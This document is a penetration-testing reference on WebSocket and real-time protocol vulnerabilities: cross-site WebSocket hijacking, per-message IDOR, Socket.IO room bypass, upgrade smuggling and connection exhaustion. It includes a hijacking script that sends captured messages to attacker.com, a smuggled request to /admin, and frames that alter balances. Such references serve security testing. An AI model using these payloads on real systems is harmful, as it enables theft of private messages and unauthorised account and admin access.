# WebSocket & Real-Time Protocol Reference

## Attack Surface Signals
- **Handshake Requests**: `GET /ws`, `/socket.io/`, `/chat`, `/cable` with:
  - `Connection: Upgrade`
  - `Upgrade: websocket`
  - `Sec-WebSocket-Version: 13`
  - `Sec-WebSocket-Key: ...`
- **Protocols & Frameworks**: Socket.IO (`/socket.io/?EIO=4&transport=websocket`), ActionCable (Rails), SignalR (ASP.NET `/hub`), Phoenix Channels.
- **Message Types**: Text JSON frames `{"action":"subscribe","channel":"private_123"}`, binary data, STOMP frames.

## Core Vulnerability Classes & Testing
1. **CSWSH (Cross-Site WebSocket Hijacking)**:
   - **Mechanism**: The initial HTTP handshake relies solely on ambient credentials (cookies/basic auth) without checking `Origin` header or CSRF tokens.
   - **Testing**:
     1. Host HTML page on external domain:
        ```html
        <script>
          const ws = new WebSocket("wss://target.com/ws/notifications");
          ws.onopen = () => ws.send(JSON.stringify({action: "get_messages"}));
          ws.onmessage = (e) => fetch("https://attacker.com/leak?d=" + encodeURIComponent(e.data));
        </script>
        ```
     2. Authenticated victim visits attacker page; attacker establishes authenticated WS connection and exfiltrates messages.
2. **Missing Per-Message Authorization**:
   - Handshake is authenticated, but individual message payloads accept object IDs without verifying ownership:
     - Frame: `{"type": "fetch_profile", "user_id": 456}` -> Returns Victim's private profile.
     - Frame: `{"action": "update_balance", "account_id": "acc_victim", "amount": 1000}`.
3. **Room & Namespace Authorization Bypass (Socket.IO / SignalR)**:
   - Join private rooms by emitting unauthorized join events:
     - `42["join_room", {"room": "admin_audit_channel"}]`
     - `42["subscribe", {"topic": "tenant_99_orders"}]`
4. **Handshake-Layer Upgrade Smuggling**:
   - Exploit reverse proxy discrepancy during `Upgrade: websocket` to smuggle HTTP/1.1 requests through an open TCP tunnel:
     ```http
     GET /ws HTTP/1.1
     Host: target.com
     Upgrade: websocket
     Connection: Upgrade
     Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
     Sec-WebSocket-Version: 13

     GET /admin HTTP/1.1
     Host: target.com
     ```
5. **Denial of Service via Continuous Connection Exhaustion**:
   - Open thousands of unclosed WebSocket handshakes to exhaust server worker threads/file descriptors.

## Exploit Chains
- **CSWSH → Private Real-Time Chat & Notification Exfiltration**.
- **Per-Message IDOR → Financial Balance Modification**.
- **Upgrade Smuggling → Reverse Proxy Filter Bypass → Internal Admin API Access**.
